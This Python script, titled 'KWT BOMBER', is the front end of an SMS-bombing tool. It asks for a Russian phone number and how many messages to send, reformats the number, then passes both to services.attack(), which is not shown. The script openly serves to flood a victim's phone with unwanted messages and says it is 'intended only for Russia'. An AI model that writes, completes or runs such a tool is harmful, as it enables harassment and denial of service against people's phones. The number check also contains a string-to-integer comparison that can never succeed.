import requests
import services
import colored
from colored import fg, bg, attr
# colours
green     = fg('#5000b8') + bg('#000000')
cyan      = fg('#274f44') + bg('#000000')
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = fg('#0000a1') + bg('#000000')

# header
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(f"{green}{bold}\t\t►KWT BOMBER◄ {end}")
print("")
print(f"{red} Number (+7)(8)")
print("")
print("")
print("")
print("")
input_number = input(green + bold  + "╞► " + end)
print("")
print("")
print("")
print("")
print(f'{red}how many sms send?')
print("")
print("")
print("")
print("")
sms = int(input(green + bold + "╞► " + end))

print()
print("")
print("")
print("")
print("")
def parse_number(number):
	msg = f"check number - {green}{bold}OK{end}"
	if len(number) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"check number - {red}{bold}failed number!{end}\nThis bomber is intended only for Russia ")
		quit()
	return number
number = parse_number(input_number)


services.attack(number, sms)
